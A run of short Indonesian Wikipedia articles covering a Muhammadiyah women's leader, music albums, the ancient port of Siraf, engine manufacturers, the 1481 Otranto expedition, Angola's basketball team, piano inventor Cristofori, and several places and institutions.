Dra. Hj. Siti Noordjannah Djohantini, M.M., M.Si. () adalah Ketua Umum Pimpinan Pusat Aisyiyah, periode 2010-2015 dan 2015-2020. Noordjannah menggantikan Prof Dr Siti Chamamah Soeratno yang sudah dua periode menjabat Ketua Pimpinan Pusat (PP) Aisyiyah. Mbak Nunung-sapaan akrabnya di tengah keluarga-yang sehari-hari bekerja sebagai dosen Fakultas Ekonomi Universitas Muhammadiyah Yogyakarta (UMY), juga pernah menjadi Anggota Panitia Pengawas Pemilu (Panwaslu) Republik Indonesia (2003-2008).

Siti Noordjannah Djohantini lahir dan dibesarkan di lingkungan keluarga yang religius. Ayahnya bernama Ardani Zaenal, sedangkan ibunya bernama Siti Juariyah. Ia menikah dengan Dr Haedar Nashir yang merupakan kader dan pengurus Pimpinan Pusat Muhammadiyah. Dari perkawinannya dengan Haedar Nashir, Noordjannah dikaruniai dua anak, yaitu Hilma Nadhifa Mujahidah dan Nuha Aulia Rahman.

Pendidikan formal yang ditempuh Noordjannah dimulai dari Muallimat Muhammadiyah Yogyakarta, kemudian SMP Muhammadiyah Godean, dan selanjutnya SMA Muhammadiyah 2 Yogyakarta. Setelah itu, Noordjannah kuliah program sarjana (S1) pada Fakultas Ekonomi Universitas Pembangunan Nasional (UPN Veteran) Yogyakarta, lalu mengambil program magister (S2) Manajemen Keuangan di Universitas Islam Indonesia (UII) Yogyakarta. Selain itu, ia juga mengambil program Human Resource Management di Universitas Gajah Mada (UGM) Yogyakarta.

Ketika sekolah hingga kuliah, Noordjannah sudah aktif di organisasi Ikatan Pelajar Muhammadiyah yang merupakan salah satu organisasi otonom Muhammadiyah untuk kalangan pelajar. Di organisasi ini, ia sempat menjabat Pimpinan Pusat IPM bidang Ipmawati pada periode 1983-1986.

Bersama teman-temannya pengurus PP IPM, Noordjannah berhasil menerbitkan buku Pedoman Seragam khusus bagi pelajar putri Muhammadiyah yang berlaku untuk seluruh Indonesia.

Setelah "ber-IPM", Noordjannah kemudian aktif di organisasi Nasyiatul Aisyiyah (Nasyiah) yang juga merupakan salah satu ortom Muhammadiyah untuk kalangan remaja putri. Di organisasi ini, Noordjannah terpilih sebagai ketua umum pada periode l990-l995, hasil Muktamar Nasyiaatul Aisyiyah, di Yogyakarta tahun 1990.

Setelah matang di Nasyiatul Aisyiyah, Noordjannah Djohantini kemudian masuk sebagai pengurus Aisyiyah. Pada periode 2000-2005, ia diserahi amanah sebagai Ketua Lembaga Pengkajian dan Pengembangan (LPP) Pimpinan Pusat Aisyiyah, selanjutnya masuk sebagai salah satu Ketua PP Aisyiyah, dan akhirnya terpilih sebagai Ketua Umum PP Aisyiyah, periode 2010-2015. Ia menggantikan Prof Dr Siti Chamamah Soeratno yang sudah dua periode menjabat Ketua PP Aisyiyah. Ia terpilih pada Muktamar ke-46 Aisyiyah, di Graha Wanabhaktiyasa, Yoyakarta, 7 Juli 2010.

Pada Pemilihan Pimpinan Aisyiyah dalam Muktamar ke-46 Aisyiyah di Yogyakarta, wanita bernama lengkap Dra Hj Siti Noordjannah Djohantini MM Msi, mengumpulkan 1.291 suara. Ia unggul atas Prof Dr Siti Chamamah (1.094 suara), Dr Masyithoh MAg (916 suara), Dra Dyah Siti Nuraini (828 suara), Dra Hj Shoimah Kastolani (557 suara).

Dalam kepengurusan PP Aisyiyah 2010-2015, Noordjannah didampingi oleh Dra Hj Dyah Siti Nuraini sebagai Sekretaris Umum.

Anggota Pimpinan Pusat Aisyiyah periode 2010-2015 yang berjumlah 13 orang, terdiri atas Dra Hj Siti Noordjannah Djohantini MM Msi, Prof Dr Hj Siti Chamamah, Prof Dr Hj Masyithoh Chusnan Mag, Dra Hj Dyah Siti Nuraini, Dra Hj Shoimah Kastolani.

Selanjutnya, Dra Hj Siti ‘Aisyah Mag, Dra Hj Nurni Akma, Dra Trias Setiawati Msi, Prof Dr Siti Muslimah Widiastuti, Dr Hj Atikah M Zakki Mars, Rohimi Zamzan SPsi MPd, Hj Hadiroh Ahmad SPd, serta Dra Hj Susilahati MSi.

Selain di lingkungan Muhammadiyah, Noordjannah juga dikenal sebagai aktivis perempuan. Ia termasuk salah seorang pendiri Yasanti (Yayasan Annisa Swasti), yaitu sebuah Lembaga Swadaya Masyarakat (LSM) perempuan pertama di Indonesia.

“Yasanti” yang ia kelola sejak tahun l982 itu, hingga kini masih eksis dan berkembang. LSM ini bergerak dalam bidang pemberdayaan kaum perempuan, khususunya dalam memberikan layanan pendidikan dan latihan bagi wanita yang bekerja sebagai buruh.

Posisi sebagai pimpinan Nasyiatul Aisyiyah dan aktivis perempuan, membawa Noordjannah mendapat kepercayaan sebagai Koordinator Program Pendidikan Politik bagi Perempuan dalam Pemilu 1999, yang diselenggarakan oleh Pimpinan Pusat Nasyiatul Aisyiyah bekerja sama dengan TAF untuk delapan (8) wilayah di Indonesia.

Pengalamannya sebagai aktivis perempuan dan kapasitas yang dimilikinya antara lain sebagai akademisi, juga membawa Noordjannah lolos dalam seleksi dan akhirnya dilantik sebagai anggota Panitia Pengawas Pemilu (Panwaslu) periode 2003-2008.

Noordjannah mewakili unsur tokoh masyarakat bersama bersama Pendeta Saut Hamonangan Sirait dan Rozy Munir.

Anggota Bawaslu lainnya, yaitu Topo Santoso dan Komaruddin Hidayat dari unsur perguruan tinggi, serta Didiek Suprianto dari unsur pers.

Tiga anggota lainnya yang ditetapkan sesuai Undang-undang Nomor 12 tahun 2003 tentang Pemilu berasal dari dari unsur kepolisian dan kejaksaan, yaitu Brigadir Jenderal Polisi Bambang Arief Sampoerna Djati dan Komisaris Besar Polisi Djony Tangkudung dari Markas Besar Polri, serta Mashudi Ridwan dari Kejaksaan Agung.



</doc>
<doc id="1750714" url="https://id.wikipedia.org/wiki?curid=1750714" title="Jangan Ada Luka">
Jangan Ada Luka

"Jangan Ada Luka" adalah album musik dari penyanyi Nicky Astria & Achmad Albar.




</doc>
<doc id="1750716" url="https://id.wikipedia.org/wiki?curid=1750716" title="Jangan Ada Angkara">
Jangan Ada Angkara

"Jangan Ada Angkara" adalah album musik ke-10 dari penyanyi Nicky Astria.




</doc>
<doc id="1750717" url="https://id.wikipedia.org/wiki?curid=1750717" title="Kemana? (album)">
Kemana? (album)

"Ke mana?" adalah album musik dari penyanyi Nicky Astria dirilis pada 10 Oktober 2003.


Logiss Records


</doc>
<doc id="1750728" url="https://id.wikipedia.org/wiki?curid=1750728" title="Siraf">
Siraf

Siraf (, juga ditulis Sīraf atau Bandar-e Sīraf (arti "bandar": pelabuhan, dalam bahasa Parsi) adalah sebuah kota kuno di Shahrestan Kangan (daerah tingkat II) di Provinsi Bushehr, di Iran.

Siraf menurut legenda merupakan kota pelabuhan Sassania kuno yang hancur pada sekitar 970 M, yang berada di pantai utara Teluk Persia, yang saat ini termasuk wilayah Provinsi Bushehr di Iran. Reruntuhannya berjarak kira-kira 220 km sebelah timur Bushehr dan 380 km sebelah barat Bandar Abbas, atau 30 km sebelah timur kota Kangan. Siraf mengatur tiga pelabuhan: Bandar-e-Taheri, Bandar-e-Kangan, dan Bandar-e-Dayer. Teluk Persia merupakan jalur pelayaran antara Jazirah Arabia dan India melalui Laut Arab. Perahu-perahu kecil, seperti "dhow", juga dapat berlayar jauh dengan cara tetap merapat ke pantai dan menjaga agar daratan selalu terlihat.

David Whitehouse, salah seorang arkeolog pertama yang menggali sisa-sisa peninggalan Siraf menyatakan bahwa perdagangan laut antara Teluk Persia dan negeri-negeri Timur Jauh mulai berkembang di kota pelabuhan ini akibat peningkatan yang tinggi atas perdagangan barang-barang konsumsi dan barang mewah pada saat itu. Hubungan pertama antara suatu tempat yang diperkirakan adalah Siraf dengan Tiongkok terjadi pada tahun 185 M. Akan tetapi, seiring berjalannya waktu jalur perdagangan bergeser ke Laut Merah dan Siraf terlupakan. Siraf sebagai sebuah pelabuhan didirikan kembali pada abad ke-9, dan menjalankan perannya hingga abad ke-15 sebelum akhirnya kondisinya menurun dengan cepat.

Pentingnya dampak sejarah Siraf atas perdagangan kuno baru-baru saja disadari. Penemuan dalam ekskavasi arkeologi antara lain adalah gading gajah dari Afrika timur, kepingan batu dari India, dan lapis lazuli dari Afghanistan. Peninggalan Siraf tersebut berasal dari era Parthia.

David Whitehouse juga menemukan bukti bahwa mesjid tertua di Siraf berasal dari abad ke-9, dan terdapat reruntuhan Parthia dan Sassania tidak seberapa jauh dari kota tersebut. Ia menemukan reruntuhan sebuah mesjid besar yang dikelilingi oleh beberapa mesjid yang lebih kecil. Terdapat peninggalan rumah-rumah mewah dari para pedagang yang sangat makmur, yang membangun kekayaan mereka melalui kesuksesan pelabuhan itu. Siraf melayani berbagai pedagang internasional, misalnya dari India Selatan yang saat itu berada di bawah kekuasaan Dinasti Chalukya Barat, yang mana mereka dijamu oleh para pedagang lokal ketika tiba di sana dalam kunjungan perdagangan mereka. Salah satu tanda pentingnya para pedagang India bagi Siraf adalah adanya catatan yang tentang piring-piring makan yang dikhususkan bagi mereka saja. Terdapat bukti sejarah perdagangan laut Sassania dengan Teluk Cambay yang saat ini termasuk Provinsi Gujarat, India, berupa ditemukannya pecahan keramik merah mengkilap India (umumnya dibuat di Gujarat pada sekitar abad ke-5 dan ke-6) di situs-situs pingir pantai dan pantai utara Teluk Persia, terutama di Siraf.

Banyak penemuan (keseluruhannya lebih dari 16.000 buah) yang diekskavasi di Siraf oleh Whitehouse dan timnya antara tahun 1960-an dan 1970-an saat ini disimpan di British Museum in London.

Siraf saat ini masih belum tercatat dalam daftar situs warisan budaya nasional Iran.




</doc>
<doc id="1750734" url="https://id.wikipedia.org/wiki?curid=1750734" title="Cheppy Chandra">
Cheppy Chandra

Cheppy Chandra (1969-12 Oktober 2017) adalah seorang aktor berkebangsaan Indonesia. Sempat membintangi beberapa film panas di akhir 1990-an, dan saat ini lebih dikenal lewat perannya dalam sinetron "Aku Anak Indonesia", sebagai Pak Anas. Cheppy Chandra meninggal dunia pada 12 Oktober 2017.





</doc>
<doc id="1750742" url="https://id.wikipedia.org/wiki?curid=1750742" title="Kali Sunter">
Kali Sunter

Kali Sunter adalah sebuah sungai yang mengalir di bagian timur kota Jakarta, Indonesia, yang memiliki aliran sungai utama sepanjang 37 km serta memiliki daerah aliran sungai seluas 73.184.092 m. Debit airnya adalah 83,8 mm saat curah hujan mencapai 100 mm. Daerah aliran sungai Kali Sunter sangat padat penghuninya, dan sering terjadi banjir. Di sepanjang sisi aliran sungai ini terdapat lima danau yang total luasnya adalah 37.2 ha, dan direncanakan pada masa depan 11 danau kecil lainnya akan dibangun untuk mengendalikan banjir dengan luas mencapai 163.74 ha.

Sungai ini mengalir di wilayah barat laut pulau Jawa yang beriklim hutan hujan tropis (kode: "Af" menurut klasifikasi iklim Köppen-Geiger). Suhu rata-rata setahun sekitar 26 °C. Bulan terpanas adalah Agustus, dengan suhu rata-rata 28 °C, and terdingin April, sekitar 24 °C. Curah hujan rata-rata tahunan adalah 3674 mm. Bulan dengan curah hujan tertinggi adalah Desember, dengan rata-rata 456 mm, dan yang terendah September, rata-rata 87 mm.

Kali Sunter saat ini sedang menjalani pemasangan tanggul dan normalisasi sungai yang berlangsung di bawah pengawasan Direktorat Jenderal Sumber Daya Air Kementerian Pekerjaan Umum dan Perumahan Rakyat. Panjang pengerjaan adalah 18,35 km, yaitu sejak Jembatan Pertemuan Banjir Kanal Timur di Cipinang Melayu hingga Jembatan Delta di Jakasampurna, Bekasi Barat.



</doc>
<doc id="1750744" url="https://id.wikipedia.org/wiki?curid=1750744" title="Imran Baidirus">
Imran Baidirus

Marsekal Muda TNI Imran Baidirus, "S.E." () adalah seorang Perwira Tinggi TNI Angkatan Udara yang merupakan lulusan Akademi Angkatan Udara tahun 1988. Yang saat ini menjabat Panglima Kohanudnas. Sebelumnya ia adalah Panglima Komando Operasional I (Pangkoops I) menggantikan Marsekal Muda TNI Yuyu Sutisna yang pindah tugas menjadi Panglima Kohanudnas Berdasarkan Keputusan Panglima TNI Nomor Kep/141/II/2017 tanggal 23 Februari 2017. Sebelumnya ia menjabat Wakil Asisten Operasi Kasau menggantikan Marsma TNI Umar Sugeng Haryono, S.Ip., S.E., M.M., Komandan Lanud Adisutjipto berdasarkan Keputusan Panglima TNI Nomor: Kep/276/IV/2015 tanggal 10 April 2015, tentang Pemberhentian dari dan pengangkatan dalam jabatan di lingkungan TNI. Upacara Serah Terima Jabatan akan dilaksanakan di Lapangan Jupiter secara militer dengan Inspektur Upacara Komandan Komando Pendidikan Angkatan Udara Marsekal Muda TNI Ras Rendro Bowo. S., SE dan Komandan Upacara Mayor Pnb Marlon Ardilles Kawer. Yang sehari hari menjabat Kepala urusan pembinaan Siswa dan tenaga kependidikan. Dan Perwira upacara Kapten Pnb Alfonsus Astani sehari hari menjabat Instruktur Penerbang Gol. 6 Wingdikterbang.

Ia tercatat sebagai lulusan Akademi Angkatan Udara tahun 1988/A . Menjadi siswa Sekolah Penerbang (Sekbang) pada tahun yang sama di Wingdik Lanud Adisutjipto. Lulus Sekbang ia bertugas sebagai penerbang tempur pesawat Hawk MK-53 di Skadron Udara 15 Lanud Iswahjudi, Madiun kurun 1989 hingga 1990.



</doc>
<doc id="1750749" url="https://id.wikipedia.org/wiki?curid=1750749" title="2si">
2si

2si adalah produsen mesin Amerika yang terletak di Beaufort, Carolina Selatan. Perusahaan ini adalah anak perusahaan yang sepenuhnya dimiliki oleh AMW Cuyuna Engine Company, sebelumnya dikenal sebagai Cuyuna Development Company.

Perusahaan mengakuisisi garis engine dua-stroke yang awalnya dirancang dan diproduksi oleh JLO dari Jerman dan mereka memasarkan di bawah nama merek Cuyuna untuk mobil salju dan kemudian menggunakan pesawat ultralight. Kemudian Cuyuna membentuk anak Two Stroke International, umumnya dikenal sebagai 2si, untuk memproduksi dan memasarkan garis mesin. Cuyuna tidak lagi menjual mesin untuk digunakan pesawat, melainkan pasar mereka untuk industri, kelautan, balap mobil, aplikasi kendaraan kart dan segala medan.


</doc>
<doc id="1750750" url="https://id.wikipedia.org/wiki?curid=1750750" title="Zeyashwemye F.C.">
Zeyashwemye F.C.

Zeyashwemye Football Club (; ; diucapkan juga Zayar Shwe Myay) adalah sebuah klub sepak bola Myanmar, yang bermarkas di Monywa Stadium di Monywa, Myanmar.

Skuat terkini



</doc>
<doc id="1750752" url="https://id.wikipedia.org/wiki?curid=1750752" title="Thielert">
Thielert

Thielert AG adalah sebuah perusahaan holding keuangan Jerman yang telah memiliki pengembangan perusahaan mesin dan manufaktur. Perusahaan ini bermarkas di Hamburg. Perusahaan yang memiliki Thielert Aircraft Engines GmbH dengan letaknya di Lichtenstein, Saxony dan Altenburg, Thuringia. Thielert AG dikutip di Bursa Efek Frankfurt dan merupakan anggota dari SDAX. Unit operasi utama, Thielert Aircraft Engines GmbH, menyatakan kebangkrutan pada 24 April 2008. Perusahaan ini dijalankan oleh administrator insolvensi, Bruno M. Kubler, dari tahun 2008 sampai Juli 2013 saat itu dijual ke Continental Motors, Inc .. Continental dimiliki oleh AVIC International, yang pada gilirannya sepenuhnya dimiliki oleh Pemerintah Republik Rakyat China.

Perusahaan induk, Thielert AG, juga mengajukan kepailitan seminggu kemudian pada tanggal 30 April 2008 setelah hilangnya unit operasional Thielert Aircraft Engines GmbH. Perusahaan induk menghentikan operasinya pada musim gugur 2008.

Thielert Aircraft Engines GmbH terkenal sebagai produsen dari berbagai mesin pesawat Centurion Diesel yang berjalan pada bahan bakar jet. Dua model mesin yang dibangun, Centurion 2.0 dengan output daya baik 135 hp (101 kW) dan Centurion 2.0s dengan 155 hp (116 kW). Pengembangan model ketiga, 350 hp (261 kW) Centurion 4.0, tidak diselesaikan. Model keempat, 230 hp (172 kW) Centurion 3.2 diumumkan untuk tahun 2008, namun perkembangan akhir dibatalkan.



</doc>
<doc id="1750754" url="https://id.wikipedia.org/wiki?curid=1750754" title="Continental Motors, Inc.">
Continental Motors, Inc.

Continental Motors, Inc. adalah produsen mesin pesawat yang terletak di Brookley Aeroplex di Mobile, Alabama, Amerika Serikat. Awalnya bagian dari Continental Motors Company pada tahun 1929 dan dimiliki oleh Teledyne Technologies hingga Desember 2010. Perusahaan ini sekarang merupakan bagian dari AVIC International, yang dimiliki oleh pemerintah Republik Rakyat Cina.

Meskipun Continental paling terkenal untuk mesin untuk pesawat ringan, juga dikontrak untuk menghasilkan mesin berpendingin udara V-12 AV-1790-5B bensin untuk tang M47 Patton Angkatan Darat AS dan dieselnya AVDS-1790-2A dan derivatif untuk M48, M60 Patton dan tank tempur utama Merkava. Perusahaan juga memproduksi mesin independen untuk berbagai produsen mobil, traktor, dan peralatan stasioner (pompa, generator dan mesin drive) dari tahun 1920 ke tahun 1960-an.



</doc>
<doc id="1750757" url="https://id.wikipedia.org/wiki?curid=1750757" title="CFE Company">
CFE Company

CFE Company adalah perusahaan patungan yang didirikan oleh GE Aviation dan Garrett Engine Division dari Allied Signal (sekarang Honeywell Aerospace) pada bulan Juni 1987.

Perusahaan ini menghasilkan CFE738, mesin turbofan kecil yang digunakan pada Dassault Falcon 2000. "CFE" singkatan dari "Commercial Fan Engines".




</doc>
<doc id="1750761" url="https://id.wikipedia.org/wiki?curid=1750761" title="Ekspedisi Portugis ke Otranto">
Ekspedisi Portugis ke Otranto

Ekspedisi Portugis ke Otranto pada 1481, yang juga disebut Perang Salib Turki oleh Portugis (), berlangsung terlambat sehingga mereka tidak terlibat dalam pertempuran sama sekali. Pada tanggal 8 April 1481, Paus Siktus IV mengeluarkan bulla kepausan "Cogimur iubente altissimo", yaitu panggilan untuk perang salib terhadap orang Turki yang saat itu sedang menduduki Otranto di Italia selatan. Harapan Paus adalah setelah berhasil menguasai kembali Otranto, para pejuang salib akan menyeberangi Laut Adriatik dan membebaskan pula kota Vlorë (Valona).

Portugal memutuskan pengiriman satu skuadron di bawah kepemimpinan Uskup Évora, Garcia de Meneses. Dalam sebuah surat tertanggal 27 Agustus 1481 kepada Kardinal Paolo di Campofregoso, Siktus menulis, "Dari Portugal ada dua puluh karavel dan sebuah kapal kargo yang kita harapkan tiba pada hari Santo Paulus, yang dipimpin oleh yang terhormat saudara Garcia, uskup dari Évora." Pada 7 September ia menulis kepada Raja Ferdinand I dari Napoli untuk mengabarkannya bahwa "sebuah armada yang kami minta sedang berlayar ke Otranto dari Portugal . . . Kami harap ini akan sangat bermanfaat dalam serangan ke Otranto . . ." Pada 14 September, yaitu tepat pada hari pasukan Utsmaniyah menyerahkan Otranto, Paus menulis dari Bracciano kepada wakil bendaharanya yang sebelumnya mengabarkan padanya mengenai lambatnya kedatangan armada Portugis. Siktus menyatakan keraguan atas niat Garcia. Hari berikutnya (15 September), ia menulis kepada uskup tersebut, memujinya atas ketekunan dan kehati-hatiannya, namun mendesaknya agar membawa armadanya ke Vlorë untuk mengusir garnisun Turki dari sana, untuk melakukan "sesuatu yang pantas bagi kehormatan agama Kristen dan Anda dan bagi raja Anda", yaitu merujuk pada Raja Alfonso V yang baru saja meninggal. Ia juga mendorong agar Garcia membawa Andreas Palaiologos, despot Morea yang terguling, kembali ke Yunani agar dapat memulai penaklukkan kembali daerah kekuasaannya.

Pada saat Portugis tiba di Napoli, pasukan Utsmaniyah telah ditarik mundur karena Sultan Utsmaniyah Mehmed II meninggal dunia pada tanggal 3 Mei dan berlangsung perselisihan mengenai penerusnya.


</doc>
<doc id="1750763" url="https://id.wikipedia.org/wiki?curid=1750763" title="Tim basket nasional Angola">
Tim basket nasional Angola

Tim basket nasional Angola mewakili Angola dalam pertandingan-pertandingan basket internasional, dan dikontrol oleh "Federação Angolana de Basquetebol". Angola telah menjadi anggota FIBA sejak 1979. Meraih peringkat ke-15 dalam Peringkat Dunia FIBA, Angola adalah tim teratas dari FIBA Afrika, dan sebuah kompetitor reguler di Permainan Olimpiade Musim Panas dan Piala Dunia FIBA.

Angola telah berkompetisi di berbagai kompetisi internasional, yakni Olimpiade Musim Panas 1992, Olimpiade Musim Panas 1996, Olimpiade Musim Panas 2000, Kejuaraan Dunia FIBA 2002, Olimpiade Musim Panas 2004, Kejuaraan Dunia FIBA 2006, dan Kejuaraan Dunia FIBA 2010, serta Kejuaraan Afrika FIBA, dimana tim tersebut telah memenangkan 13 dari 13 kejuaraan terakhir, yang pertama kali datang pada 1989, dan paling terkini pada 2013. Selain itu, tim tersebut memenangkan turnamen untuk Basket di All-Africa Games 2007.

Angola berkompetisi di Kejuaraan Dunia FIBA 2006 dalam Grup B, bersama dengan Jerman, Jepang, Selandia Baru, Panama, dan Spanyol. Dalam permainan grup, mereka selesai dengan 3 kemenangan (melawan Panama, Selandia Baru, dan Jepang), dan 2 kekalahan (melawan Spanyol dan Jerman).

Tim untuk Piala Dunia Basket FIBA 2014.





Kejuaraan Dunia 1986: mendapatkan peringkat ke-20 dari 24 tim

Jean-Jacques, David Dias, Manuel Sousa (Necas), Aníbal Moreira, Adriano Baião, Josué Campos, José Carlos Guimaraes, Zezé Assis, Ademar Barros, Paulo Macedo (Pelatih: Victorino Cunha)

Permainan Olimpiade 1988: tidak berpartisipasi

Kejuaraan Dunia 1990: mendapatkan peringkat ke-13 dari 16 tim

Jean-Jacques, David Dias, Aníbal Moreira, Paulo Macedo, Manuel Sousa (Necas), Ademar Barros, Ângelo Victoriano, José Carlos Guimarães, Ivo Alfredo, Nelson Sardinha, Herlander Coimbra, Víctor de Carvalho (Pelatih: Victorino Cunha)

1992 Olympic Games: mendapatkan peringkat ke-10 dari 12 tim

Jean-Jacques, David Dias, José Carlos Guimaraes, Manuel Sousa (Necas), Benjamin Avô, Paulo Macedo, Benjamim Romano, Nelson Sardinha, Víctor de Carvalho, Herlander Coimbra, Aníbal Moreira, Ângelo Victoriano (Pelatih: Victorino Cunha)

Kejuaraan Dunia 1994: mendapatkan peringkat ke-16 dari 16 tim

Jean-Jacques, David Dias, Herlander Coimbra, Ivo Alfredo, Benjamim Romano, Aníbal Moreira, Víctor de Carvalho, Benjamin Avô, Paulo Macedo, Honorato Trosso, Ângelo Victoriano, Garcia Domingos (Pelatih: Victorino Cunha)

Permainan Olimpiade 1996: mendapatkan peringkat ke-11 dari 12 tim

Jean-Jacques, David Dias, Víctor de Carvalho, Ângelo Victoriano, Benjamin Avô, Honorato Trosso, Aníbal Moreira, Herlander Coimbra, José Carlos Guimarães, Benjamim Romano, Edmar Victoriano, Justino Victoriano (Pelatih: Wlademiro Romero)

Kejuaraan Dunia 1998: tidak berpartisipasi

Permainan Olimpiade 2000: mendapatkan peringkat ke-12 dari 12 tim

David Dias, Herlander Coimbra, Víctor de Carvalho, Aníbal Moreira, Edmar Victoriano, Victor Muzadi, Ângelo Victoriano, Mário Belarmino, Buila Katiavala, Carlos Almeida, Miguel Lutonda, Garcia Domingos (Pelatih: Mário Palma)

Kejuaraan Dunia 2002: mendapatkan peringkat ke-11 dari 16 tim

Víctor de Carvalho, Eduardo Mingas, Ângelo Victoriano, Victor Muzadi, Miguel Lutonda, Mário Belarmino, Edmar Victoriano, Kikas Gomes, Afonso Silva, Carlos Almeida, Gerson Monteiro, Walter Costa (Pelatih: Mário Palma)

Permainan Olimpiade 2004: mendapatkan peringkat ke-12 dari 12 tim

Olímpio Cipriano, Victor Muzadi, Edmar Victoriano, Víctor de Carvalho, Eduardo Mingas, Abdel Bouckar, Miguel Lutonda, Ângelo Victoriano, Kikas Gomes, Carlos Almeida, Gerson Monteiro, Walter Costa (Pelatih: Mário Palma)

Kejuaraan Dunia 2006: mendapatkan peringkat ke-10 dari 24 tim

Olímpio Cipriano, Víctor de Carvalho, Kikas Gomes, Abdel Bouckar, Miguel Lutonda, Eduardo Mingas, Luís Costa, Mílton Barros, Emanuel Neto, Armando Costa, Carlos Morais, Carlos Almeida (Pelatih: Alberto de Carvalho)












----

----




</doc>
<doc id="1750765" url="https://id.wikipedia.org/wiki?curid=1750765" title="Bartolomeo Cristofori">
Bartolomeo Cristofori

Bartolomeo Cristofori di Francesco (4 Mei 1655 - 27 Januari 1731) merupakan seorang komponis Italia dan orang pertama yang menemukan piano.

Awalnya, ia bekerja menciptakan instrumen harpsichord dan clavichord untuk Pangeran Ferdinando de Medici, anak dari adipati Tuscany. Ia tidak pernah menyangka instrumen ciptaannya tersebut bisa menjadi sebuah satu alat yang bernama piano.

Tali-tali halus harpsichord dibuat untuk membuat nada dengan volume yang bervariasi. Dan akhirnya, ia mampu mendesain mekanisme yang dapat mentransfer tekanan lewat sebuah alat yang bisa ditekan untuk membunyikan tali-tali halus tersebut.

Konsep piano kemudian ia matangkan pada era 1690an dan alat pertamanya diciptakan pada 1709. Ia menyebut penemuannya dengan istilah “gravecembalo col piano e forte”, sebuah tali clavichord dengan suara pelan dan keras.

Nama tersebut akhirnya disingkat menjadi pianoforte yang pada akhirnya orang-orang menyebutnya dengan sebutan paling sederhana yaitu `piano`.

Ternyata, konsep piano pada awalnya diciptakan tak hanya dari ide Cristofori. Banyak para pembuat instrumen musik berusaha untuk mencoba membuat alat dari tali harpsichord tersebut, namun pada akhirnya penemuan Cristofori dipertimbangkan menjadi sebuah piano dengan konsep termatang.



</doc>
<doc id="1750770" url="https://id.wikipedia.org/wiki?curid=1750770" title="Valrico, Florida">
Valrico, Florida

Valrico adalah sebuah tempat yang dirancang sensus (CDP) di Kabupaten Hillsborough, Florida, Amerika Serikat. Penduduknya berjumlah 35,545 orang menurut sensus 2010.

Valrico dimulai sebagai wilayah penanaman kapas yang dikenal sebagai Long Pond. Kedatangan Florida Central dan Jalur Kereta Api Peninsular pada 1890 membawa beberapa imigran baru dari titik-titik utara. William G. Tousey, seorang profesor filsafat dari Tufts College, memberikan komunitas tersebut nama saat ininya, yang berasal dari frasa Spanyol yang artinya "lembah emas."

Valrico terletak di (27.940774, -82.242551).

Menurut Biro Sensus Amerika Serikat, komunitas tersebut memiliki wilayah seluas , yang nya adalah tanah dan nya (1.41%) adalah air.



</doc>
<doc id="1750772" url="https://id.wikipedia.org/wiki?curid=1750772" title="Raudhatul Athfal Ar Raihan">
Raudhatul Athfal Ar Raihan

Raudhatul Athfal Ar Raihan (RA Ar Raihan) adalah lembaga pendidikan anak usia dini setingkat taman kanak-kanak yang dikelola oleh Yayasan Ar Raihan Bantul. Raudhatul Athfal Ar Raihan dikenal juga dengan sebutan TKIT (Taman Kanak-kanak Islam Terpadu) Ar Raihan. Lembaga ini terletak di Kecamatan Bantul dan sejak 2013 menjadi Rintisan RA Unggul program Kementerian Agama Kanwil Daerah Istimewa Yogyakarta.

Raudhatul Athfal Ar Raihan didirikan pada tanggal 1 Juli 1997 dan menyelenggarakan kegiatan belajar-mengajar di rumah pribadi pasangan Trianawati Nunung Bintari-Arif Rahman Hakim yang berlokasi di Dusun Mandingan, Kelurahan Ringinharjo, Kecamatan Bantul, Kabupaten Bantul, Provinsi Daerah Istimewa Yogyakarta. Pada tahun pertama itu, jumlah siswa yang dididik sebanyak tujuh orang. Pada awal pendiriannya, lembaga ini memiliki nama TKIT atau Taman Kanak-kanak Islam Terpadu Ar Raihan. Akan tetapi, berkaitan dengan formalitas pendirian lembaga pendidikan, TKIT Ar Raihan kemudian berubah nama menjadi Raudhatul Athfal Ar Raihan dan berafiliasi kepada Kementerian Agama Republik Indonesia.

Secara bertahap, dari tahun ke tahun siswa lembaga ini semakin meningkat. Oleh karena peningkatan jumlah siswa tersebut, kegiatan belajar-mengajar pun tidak dapat lagi dilaksanakan di kediaman pasangan Trianawati Nunung Bintari dan Arif Rahman Hakim. Dengan alasan ini dan agar kegiatan belajar-mengajar lebih maksimal, Raudhatul Athfal Ar Raihan menyewa tempat khusus untuk kegiatan belajar-mengajar. Dinamika perkembangan lembaga kemudian menuntut lembaga ini untuk memiliki gedung sendiri.

Gedung pertama yang dimiliki Raudhatul Athfal Ar Raihan berdiri di tanah wakaf dr. Ahmad Asmedi (2003). Pada perkembangan selanjutnya, bangunan ini ternyata juga belum mencukupi untuk menampung kegiatan belajar-mengajar Raudhatul Athfal Ar Raihan yang siswanya meningkat menjadi sepuluh kelas. Oleh karena itu, terhitung 16 Mei 2015, kegiatan belajar-mengajar Raudhatul Athfal Ar Raihan dipindahkan ke gedung baru di Kweden, tepatnya di Dusun Kweden, Kelurahan Trirenggo, Kecamatan Bantul, Kabupaten Bantul, Provinsi Daerah Istimewa Yogyakarta. Sehubungan dengan kepindahan ini, gedung lama Raudhatul Athfal Ar Raihan ditempati oleh KBIT Ar Raihan Bantul dan TPA Ar Raihan Bantul.

Kepala sekolah yang pernah memimpin Raudhatul Athfal Ar Raihan adalah sebagai berikut.








</doc>
<doc id="1750773" url="https://id.wikipedia.org/wiki?curid=1750773" title="Pine Hill, New Jersey">
Pine Hill, New Jersey

Pine Hill adalah sebuah borough di Kabupaten Camden, New Jersey, Amerika Serikat. Menurut Sensus Amerika Serikat 2010, borough tersebut memiliki penduduk berjumlah 10,233 orang, menunjukkan berkurangnya 647 orang (-5.9%) dari 10,880 orang yang disebutkan dalam Sensus 2000, yang bertambah 1,026 orang (+10.4%) dari 9,854 orang yang disebutkan dalam Sensus 1990.

Borough Pine Hill dibuat pada 23 April 1929, dari Kotapraja Clementon, salah satu dari tujuh munisipalitas dari kotapraja yang sekarang telah ditiadakan, dan salah satu dari lima munisipalitas baru (yakni Hi-Nella Borough, Lindenwold Borough, Pine Valley Borough dan Somerdale Borough) yang dibuat pada tanggal yang sama.

Pine Hill terletak di (39.786806,-74.984657). Menurut Biro Sensus Amerika Serikat, borough tersebut memiliki wilayah seluas 3.913 mil persegi (10.136 km), yang 3.871 mil persegi (10.026 km) adalah tanah dan 0.042 mil persegi (0.109 km) (1.08%) adalah air.

Borough tersebut berbatasan dengan Borough Berlin, Borough Clementon, Kotapraja Gloucester, Lindenwold, Pine Valley, Kotapraja Winslow.



</doc>
